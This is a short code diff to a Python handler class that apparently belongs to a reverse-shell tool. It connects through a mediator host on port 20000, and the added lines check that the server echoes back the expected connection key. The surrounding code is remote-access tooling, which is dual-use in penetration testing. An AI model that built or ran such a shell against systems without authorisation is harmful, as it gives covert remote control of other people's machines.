@@ -109,6 +109,11 @@ class Handler:
         self.shell.connect((gethostbyname(mediatorHost), 20000))
         # send verification
         self.shell.sendall(self.connectionKey.encode())
+        verification = self.shell.recv(1024)
+        if verification.decode() != self.connectionKey:
+            print("ERROR: Connection key validation failed")
+            print("Server responded with the wrong key")
+            exit(1)
 
     def run(self):
         # start I/O threads to control the reverse shell
